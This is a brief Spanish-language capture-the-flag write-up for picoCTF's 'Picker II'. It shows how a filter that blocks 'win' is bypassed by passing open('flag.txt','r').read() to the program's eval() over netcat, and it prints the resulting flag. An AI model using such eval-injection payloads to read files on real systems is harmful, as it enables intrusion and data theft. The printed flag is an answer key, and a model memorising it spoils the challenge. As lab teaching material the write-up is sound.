## Descripción 
Can you figure out how this program works to get the flag? Connect to the program with netcat: `$ nc saturn.picoctf.net 57813` The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/523/picker-II.py).
## Solución
- nos conectamos y nos pide un numero random
- se nos da un .py
-  vemos que en el codigo oculta el llamdo a la funcion si lo queremos hacer, por lo que tenemos que acceder de otra manera 
```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```

- pero vemos que se sigue obteniendo el valor del usuario con la funcion eval(), por lo cual le podemos mandar funciones para obtener la flag
```python
nc saturn.picoctf.net 57813
==> open('flag.txt','r').read
==> print(open('flag.txt','r').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
'NoneType' object is not callable

```
## Notas adicionales

# Referencias
